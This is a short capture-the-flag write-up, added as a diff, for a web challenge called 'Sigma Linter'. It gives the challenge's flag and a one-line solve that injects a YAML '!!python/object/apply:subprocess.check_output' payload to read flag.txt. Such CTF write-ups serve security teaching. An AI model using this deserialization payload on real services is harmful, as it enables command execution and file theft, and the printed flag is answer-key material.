@@ -1,0 +1,39 @@
+<h1 id="-sigma-linter">🌐 Sigma Linter</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>🌐 Web</td>
+      <td>John Hammond</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>Oh wow, another web app interface for command-line tools that already exist!</p>
+
+<p>This one seems a little busted, though…</p>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>Web command injection</li>
+</ul>
+
+<h2 id="solve">Solve</h2>
+<p>From the initial YAML</p>
+
+<p>Change category line to</p>
+
+<p><code class="language-plaintext highlighter-rouge">category: !!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]</code></p>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">flag{b692115306c8e5c54a2c8908371a4c72}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
